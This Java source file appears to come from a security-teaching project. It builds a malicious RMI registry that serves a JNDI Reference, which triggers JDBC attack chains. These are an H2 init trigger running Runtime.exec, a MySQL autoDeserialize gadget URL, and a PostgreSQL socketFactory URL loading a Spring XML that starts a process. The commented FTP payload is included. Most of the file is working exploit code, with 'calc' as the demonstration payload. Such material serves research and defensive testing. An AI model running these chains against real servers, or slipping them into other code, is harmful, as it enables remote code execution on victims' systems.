package org.joychou.util;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.HashMap;


public class JNDITest {
    public static String tomcat_dbcp2_factory = "org.apache.tomcat.dbcp.dbcp2.BasicDataSourceFactory";
    public static String tomcat_dbcp1_factory = "org.apache.tomcat.dbcp.dbcp.BasicDataSourceFactory";
    public static String commons_dbcp2_factory = "org.apache.commons.dbcp2.BasicDataSourceFactory";
    public static String commons_dbcp1_factory = "org.apache.commons.dbcp.BasicDataSourceFactory";

    public static String H2_JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
            "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
            "java.lang.Runtime.getRuntime().exec('calc')\n" +
            "$$\n";
    // 需要伪造Mysql服务器的返回，利用工具：https://github.com/fnmsd/MySQL_Fake_Server
    public static String MYSQL_JDBC_URL = "jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_cc6";


    private static Reference buildRef(HashMap<String, String> addrs, String factory, String JDBC_URL) {

        Reference ref = new Reference("javax.sql.DataSource", factory, null);
        ref.add(new StringRefAddr("url", JDBC_URL));
        // 使用 Lambda 表达式遍历 HashMap
        addrs.forEach((key, value) -> {
            ref.add(new StringRefAddr(key, value));
        });
        return ref;
    }

    private static HashMap<String, String> genH2ReferenceAddr() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("driverClassName", "org.h2.Driver");
        hashMap.put("username", "root");
        hashMap.put("password", "password");
        hashMap.put("initialSize", "1");
        return hashMap;
    }

    private static HashMap<String, String> genMysqlReferenceAddr() {
        HashMap<String, String> hashMap = new HashMap<>();
        hashMap.put("driverClassName", "com.mysql.jdbc.Driver");
        hashMap.put("initialSize", "1");
        return hashMap;
    }

    public static void JNDIstart() throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = buildRef(genMysqlReferenceAddr(), tomcat_dbcp2_factory, MYSQL_JDBC_URL);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit", referenceWrapper);
        System.out.println("Creating evil RMI registry on port 1099");
    }


    public static void postgresqlTest() throws SQLException {
        /*
        python启用ftp服务器python3 -m pyftpdlib -d .
        ftp服务器上的test.xml内容：
        <?xml version="1.0" encoding="UTF-8" ?>
            <beans xmlns="http://www.springframework.org/schema/beans"
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                xsi:schemaLocation="
                http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
                <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
                    <constructor-arg >
                    <list>
                        <value>calc</value>
                    </list>
                    </constructor-arg>
                </bean>
            </beans>
        */
        DriverManager.getConnection("jdbc:postgresql://localhost:5432/testdb?socketFactory=org.springframework.context.support.FileSystemXmlApplicationContext&socketFactoryArg=ftp://127.0.0.1:2121/test.xml");
    }

    /**
     * 参考链接：
     * https://tttang.com/archive/1405/
     * https://tttang.com/archive/1462/
     * @param args
     * @throws Exception
     */
    public static void main(String[] args) throws Exception {
        JNDIstart();

    }
}
